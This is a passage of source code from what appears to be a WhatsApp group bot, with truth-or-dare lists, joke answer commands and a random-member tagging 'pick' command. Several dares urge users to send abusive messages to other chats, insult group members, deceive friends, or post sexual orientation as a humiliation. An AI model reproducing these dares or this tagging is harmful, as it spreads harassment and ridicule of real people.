    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner xeon through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose DARE_\n'+ xeondare
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"PLAY AGAIN 🤔\",\"id\":\"${prefix}dare"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
              break
                            break
       case 'turut':{
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, xeon?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose TRUTH_\n'+ xeontruth
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"PLAY AGAIN 🤔\",\"id\":\"${prefix}truth"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
              break
			case 'pickupline': {
try {
    let res = await fetch(`https://api.popcat.xyz/pickuplines`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: pickupLine
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
  }
  break
			case 'pick': {
            	if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
            	if (!text) return replygcyuta(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await Yuta.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let xeonshimts = member[Math.floor(Math.random() * member.length)]
             let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `The most *${text}* here is *@${xeonshimts.split("@")[0]}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [xeonshimts], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
             
         }
     break
			case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${themeemoji} *Fact:* ${data.fact}\n`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
    }
    break
			case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xeonkak
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg') }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
break
            case 'soulmate': {
            if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `👫Your Soulmate Is

@${me.split('@')[0]}\n\n          ❤️\n\n@${jodoh.split('@')[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/soulmate.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀❤️\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [me, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `💏Couple\n\n@${orang.split('@')[0]}\n\n          ❤️\n\n@${jodoh.split('@')[0]}\n\nCieeee, What's Going On❤️💖👀`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/couple.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀❤️\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [orang, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
            }
            break
			case 'can': {
            	if (!text) return replygcyuta(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg') }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'is': {
            	if (!text) return replygcyuta(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg') }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'when': {
            	if (!text) return replygcyuta(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg') }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'what': {
            	if (!text) return replygcyuta(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg') }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'where': {
if (!text) return replygcyuta(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg') }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'how': {
            	if (!text) return replygcyuta(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg') }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'rate': {
            	if (!text) return replygcyuta(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg') }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
            }
            break
			case 'define': 
if (!q) return replygcyuta(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcyuta(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: reply
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg') }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
